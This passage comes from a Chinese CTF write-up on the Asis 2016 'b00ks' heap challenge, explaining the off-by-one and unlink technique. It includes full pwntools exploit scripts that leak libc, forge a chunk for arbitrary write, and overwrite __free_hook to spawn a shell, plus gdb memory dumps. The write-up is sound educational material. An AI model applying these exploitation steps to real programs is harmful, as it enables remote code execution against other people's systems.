<h5 id="这里部分就只是泄露了"><a href="#这里部分就只是泄露了" class="headerlink" title="这里部分就只是泄露了"></a>这里部分就只是泄露了</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">offset = <span class="number">0x45216</span> </span><br><span class="line">offset = <span class="number">0x4526a</span> </span><br><span class="line"><span class="comment">#offset = 0xf02a4 </span></span><br><span class="line"><span class="comment">#offset = 0xf1147</span></span><br><span class="line">one_gadget = libc_base + offset</span><br><span class="line">io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure>

<p>这里那个固定偏移，第一部分libc_base我是通过vmmap获得libc基地址，然后我调试的时候减一下就获得这个固定偏移了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line"><span class="number">0x0000564350ee5000</span> <span class="number">0x0000564350ee7000</span> r-xp	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e6000</span> <span class="number">0x00005643510e7000</span> r--p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e7000</span> <span class="number">0x00005643510e8000</span> rw-p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x0000564351cdd000</span> <span class="number">0x0000564351cff000</span> rw-p	[heap]</span><br><span class="line"><span class="number">0x00007f2805862000</span> <span class="number">0x00007f2805a22000</span> r-xp	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805a22000</span> <span class="number">0x00007f2805c22000</span> ---p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c22000</span> <span class="number">0x00007f2805c26000</span> r--p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c26000</span> <span class="number">0x00007f2805c28000</span> rw-p	/home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c28000</span> <span class="number">0x00007f2805c2c000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805c2c000</span> <span class="number">0x00007f2805c52000</span> r-xp	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e0a000</span> <span class="number">0x00007f2805e51000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805e51000</span> <span class="number">0x00007f2805e52000</span> r--p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e52000</span> <span class="number">0x00007f2805e53000</span> rw-p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e53000</span> <span class="number">0x00007f2805e54000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007ffd06df4000</span> <span class="number">0x00007ffd06e15000</span> rw-p	[<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0x00007ffd06edc000</span> <span class="number">0x00007ffd06edf000</span> r--p	[vvar]</span><br><span class="line"><span class="number">0x00007ffd06edf000</span> <span class="number">0x00007ffd06ee1000</span> r-xp	[vdso]</span><br></pre></td></tr></table></figure>
<p>在heap下面权限为r-xp的start部分的地址就是libc基地址了，<br>然后任选一个泄露的<br>[+] book2 name addr: 0x7f2805e2c010<br>[+] book2 des addr: 0x7f2805e0a010<br>我选了description部分的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (<span class="keyword">default</span>, Apr  <span class="number">6</span> <span class="number">2019</span>, <span class="number">01</span>:<span class="number">42</span>:<span class="number">57</span>) </span><br><span class="line">[GCC <span class="number">8.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x7f2805e0a010</span><span class="number">-0x00007f2805862000</span>)</span><br><span class="line">'0x5a8010'</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>就是这个固定偏移了</p>
<p>至于libc跟one_gadget偏移，用工具吧one_gadget</p>
<h5 id="最后任意地址写"><a href="#最后任意地址写" class="headerlink" title="最后任意地址写"></a>最后任意地址写</h5><ol>
<li>先编辑book1的description改成free_hook地址，就是将book2的description指针指向free_hook</li>
<li>编辑book2的description，就是写入one_gadget了</li>
<li>最后在调用一次free就可以getshell了<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h4 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h4><p>void unlink(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</p>
<p>{</p>
<pre><code>FD = P-&gt;fd;

BK = P-&gt;bk;

FD-&gt;bk = BK;

BK-&gt;fd = FD;</code></pre><p>}<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解原理</a><br>我觉得那张图配的十分好，就是双向链表的解链过程，好好理解，不理解没法搞下去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> pre_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *fd; <span class="comment">//前驱指针 forward</span></span><br><span class="line">    <span class="keyword">char</span> *bk; <span class="comment">// 后继指针 back</span></span><br><span class="line">    数据部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这样，我创建三个这个结构体，a,b,c连接部分如下图，<br>链表： a&lt;-&gt;b&lt;-&gt;c<br>将b从链表中解链就是unlink<br>过程：</p>
<ol>
<li>FD = b-&gt;fd; //实际就是FD=a</li>
<li>BK = b-&gt;bk; //实际就是BK=c</li>
<li>FD-&gt;bk = BK; //就是从a-&gt;b变成a-&gt;c</li>
<li>BK-&gt;fd = FD; //就是从c-&gt;b变成c-&gt;a</li>
</ol>
<p>那unlink为什么能利用，进行攻击呢？我也纠结了这个很久，从ctf-wiki上了解的过去的unlink就不讲了，那时候的攻击方式比较简单，我只讲现今的unlink攻击方式<br>我们可以通过伪造chunk，让他解链的时候unlink一个我们伪造的chunk，这样的话，我们实际就达到了一个赋值的效果，而具体的效果从例子中讲解吧</p>
<h5 id="unlink攻击过程"><a href="#unlink攻击过程" class="headerlink" title="unlink攻击过程"></a>unlink攻击过程</h5><ol>
<li>利用off-by-one覆盖掉结果的null字节，泄露第一个堆块的地址</li>
<li>泄露掉后利用unlink，使得堆块4的mem部分的指针指向ptr-0x18处，ptr-0x18为自定义的地址，其实就是堆块4，就是create出来的那个堆块</li>
<li>覆盖堆块4的内容，修改了堆块4的description的指针，指向了堆块6的description部分的指针</li>
<li>其实第三部分就相当于获得了一个任意地址读写的指针</li>
<li>这里有好几次修改容易绕晕，我绕了两天才绕出来，第一次修改的时候是将chunk4整体改写，从开头到description指针，全部改掉，将chunk4的description指向chunk6结构体的description</li>
<li>然后第二次编辑的时候就是编辑chunk6结构体的description，这样就可以修改chunk6的description指针指向任意地点</li>
<li>利用这个特性输出，输出了libc的地址，具体libc在哪个位置可以通过调试得到</li>
<li>利用这个特性任意地址写<br>先对整体过程有个大概的了解，在一步步讲</li>
</ol>
<h5 id="过程中的坑"><a href="#过程中的坑" class="headerlink" title="过程中的坑"></a>过程中的坑</h5><ol>
<li>开头remove两次是有原因的，这样会让堆块6的结构体在前面几个堆块内，因为堆块同样大小的在free过后在malloc后会再次利用，这样方便我们自己调试查看以及利用</li>
<li>调试时候的计算问题，可以用你当时调试出来的减去后两位数字，获得个heap_base这样直接利用heap_base + 偏移比较快计算结果</li>
<li>当申请不是16的整数倍的时候，他会转换成16的整数倍，比如我exp中的0x108，实际大小会变成111，还有个1是标记的，他会将下一个chunk的pre_size拿来使用，因为没有free的话，pre_size是没用的，为了不浪费空间，就使用了</li>
</ol>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">    printf()</span><br><span class="line">    io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">    first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">    heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">    ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    remove(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">    printf()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()</span><br><span class="line">    io.info(content)</span><br><span class="line">    libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>同样，我只讲解exp部分的内容，其余一样是准备工作</p>
<h5 id="填充并泄露堆块1地址"><a href="#填充并泄露堆块1地址" class="headerlink" title="填充并泄露堆块1地址"></a>填充并泄露堆块1地址</h5><p>一样的过程，利用off-by-one泄露地址，不讲了，只讲重点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">printf()</span><br><span class="line">io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
<h5 id="创建堆块并remove掉"><a href="#创建堆块并remove掉" class="headerlink" title="创建堆块并remove掉"></a>创建堆块并remove掉</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>这里是要将book6的结构体位置放到前面，方便利用，你可以自己去调试试试，不这样做的话，位置很难找，因为他定义的存储这个结构体的大小也是0x20+0x10(数据部分+结构部分)</p>
<h5 id="unlink部分-重点"><a href="#unlink部分-重点" class="headerlink" title="unlink部分(重点)"></a>unlink部分(重点)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">remove(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li>创建两个smallchunk，因为unlink只有在smallbin下才可以，fastbin不行</li>
<li>最后一个chunk是用来编辑的，以及free的，free的参数要带/bin/sh，就是要将他改写成system函数</li>
<li>heap_base = first_heap - 0x80这个偏移自己定，每次调试可能都不一样，反正只要对的上你自己调试的时候就行，方便自己计算，我这里调试的时候是<br>[+] first_heap: 0x56182d174080所以减了0x80</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a5080</span></span><br><span class="line"><span class="number">0x5653ee7a5080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005653ee7a5020</span></span><br><span class="line"><span class="number">0x5653ee7a5090</span>:	<span class="number">0x00005653ee7a5050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005653ee7a50e0</span></span><br><span class="line"><span class="number">0x5653ee7a50c0</span>:	<span class="number">0x00005653ee7a53e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5653ee7a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5110</span>:	<span class="number">0x0000565300000005</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a5120</span>:	<span class="number">0x00005653ee7a52e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5653ee7a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5140</span>:	<span class="number">0x0000003434343434</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5170</span>:	<span class="number">0x0000565300000004</span>	<span class="number">0x00005653ee7a51a0</span></span><br><span class="line"><span class="number">0x5653ee7a5180</span>:	<span class="number">0x00005653ee7a51d0</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5653ee7a5190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a51a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a51b0</span>:	<span class="number">0x00005653ee7a5170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> #chunk4</span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这是我显示first_heap后的数据，0x5653ee7a51d0便是申请的0x108的chunk，我在这里伪造了一个chunk，fd和bk在0x5653ee7a51e0，然后通过溢出将下个chunk的pre_size改成我这个伪造的chunk大小<br>在看看相邻的堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a51c0</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #伪造的chunk记为p</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span 